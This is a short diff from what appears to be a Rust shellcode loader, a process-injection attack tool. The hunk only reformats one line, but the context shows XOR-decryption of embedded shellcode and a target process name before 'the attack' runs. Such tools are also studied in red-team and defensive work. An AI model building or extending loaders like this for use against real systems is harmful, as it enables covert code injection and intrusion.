@@ -42,7 +42,8 @@ fn main() {
 
     // Decrypts the shellcode and target process or returns them unchanged, dependent on features
     let shellcode = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, SHELLCODE).unwrap();
-    let target_process = rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, TARGET_PROCESS).unwrap();
+    let target_process =
+        rco_utils::xor_encrypt_decrypt(rco_config::XOR_KEY, TARGET_PROCESS).unwrap();
     let target_process = str::from_utf8(&target_process).unwrap();
 
     // Runs whichever version of the attack was compiled
